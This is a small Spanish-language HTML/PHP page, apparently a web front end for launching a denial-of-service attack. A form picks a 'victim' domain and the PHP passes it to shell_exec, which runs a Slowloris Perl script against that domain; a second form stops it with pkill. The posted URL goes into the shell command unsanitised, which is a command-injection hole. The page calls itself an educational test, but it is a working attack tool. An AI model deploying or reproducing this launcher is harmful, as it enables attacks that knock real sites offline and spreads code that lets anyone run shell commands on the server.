<!DOCTYPE html>
<html>
<body bgcolor="#848484">

<center><b>Ataque DoS</b><br>
<b>========</b>
</center>
<br><br><br>

<form action="#" method="POST">
 <fieldset>
  <legend><b>Elija la url de la victima:</b></legend>
         <select name="url">
 		<option value=" "></option>
 		<option value="segunlu-demo.cf">segunlu-demo.cf</option>
  		<option value="segunlu.cf">segunlu.cf</option>
                </select>
        <input type="submit" value="Atack">
 </fieldset>
</form>
<br>

<form action="#" method="POST">
 <fieldset>
  <legend><b>Pulse el botón para frenar el ataque:</b></legend>
        <input type="submit" value="stop">
	<input type="hidden" name="control" value="parar">
 </fieldset>
</form>
<br>



<p><b>Nota:</b> Esto es una prueba educativa</p>

	<?php
		function atack_dos(){
			# Realizar el ataque DoS
			shell_exec('perl dos/slowloris.pl -dns ' . $_POST['url']);

			# Parar el ataque
			if($_POST['control'] == 'parar'){
				shell_exec('pkill -f slowloris');
			}
		}

	atack_dos();
	?>

</body>
</html>
